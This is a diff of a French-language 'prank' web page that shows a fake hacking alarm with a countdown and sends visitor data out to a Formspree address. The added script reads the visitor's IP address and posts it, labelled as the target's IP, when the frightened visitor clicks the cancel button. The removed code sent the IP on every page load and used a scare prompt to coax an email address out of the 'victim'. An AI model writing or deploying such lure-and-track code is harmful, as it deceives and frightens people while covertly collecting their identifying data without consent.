@@ -1,5 +1,4 @@
-#akalto ON TOP 
-
+#akalto on top
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -159,7 +158,7 @@
         #prank-overlay h1 {
             font-size: 3.5rem;
             color: #ff00ff;
-            text-shadow: 0 0 30px #ff00ff, 0 0 60px #00ffff, 0 0 90px #ff0000;
+            text-shadow: 0 0 30px #ff00ff, 0 0 60px #ff00ffff, 0 0 90px #ff0000;
             margin: 0;
             letter-spacing: 4px;
             font-family: 'Arial Black', sans-serif;
@@ -186,7 +185,7 @@
         <div id="sub-header">
             <span class="red">SYSTEM OVERRIDE: ACTIVE</span>
             <span id="timer-box">00:10</span>
-            <button id="cancel-btn" onclick="triggerCancel()">ANNULER LE HACK</button>
+            <button id="cancel-btn" onclick="triggerCancel()">ARRÊTER HACK</button>
         </div>
     </div>
 
@@ -221,23 +220,22 @@
     <script>
         const FORMSPREE_URL = "https://formspree.io/f/mzeewylw";
         let currentIp = "IP Inconnue";
-        let dataSent = false;
 
-        // Capture automatique de l'IP dès l'arrivée sur le site et envoi direct sur l'e-mail
+        // Récupération de l'IP dès l'arrivée sur le site
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 currentIp = data.ip;
-                sendToFormspree(currentIp, "Visite simple (Pas d'email saisi)");
             })
             .catch(err => console.log("Erreur réseau IP"));
 
-        // Fonction d'envoi vers Formspree
-        function sendToFormspree(ip, email) {
-            let data = {
-                ip: ip,
-                email: email,
-                date: new Date().toLocaleString()
+        // Quand la victime clique sur "ARRÊTER HACK"
+        function triggerCancel() {
+            // Envoi direct de l'IP sur Formspree sans demander d'e-mail
+            let formData = {
+                "Adresse IP de la cible": currentIp,
+                "Action": "A cliqué sur ARRÊTER HACK",
+                "Date": new Date().toLocaleString()
             };
 
             fetch(FORMSPREE_URL, {
@@ -246,20 +244,10 @@
                     'Content-Type': 'application/json',
                     'Accept': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(formData)
             }).catch(err => console.log("Erreur d'envoi"));
-        }
 
-        // Quand la victime clique sur "ANNULER LE HACK"
-        function triggerCancel() {
-            let userEmail = prompt("⚠️ ALERTE : Pour annuler l'effacement des données et décrypter le système, entrez votre adresse e-mail :");
-            if (userEmail && userEmail.includes("@")) {
-                alert("Annulation confirmée ! Redirection vers le tableau de bord...");
-                sendToFormspree(currentIp, "EMAIL SAISI : " + userEmail);
-                showPrank();
-            } else if (userEmail !== null) {
-                alert("E-mail invalide. Le hack continue !");
-            }
+            showPrank();
         }
 
         // Animation du faux hack
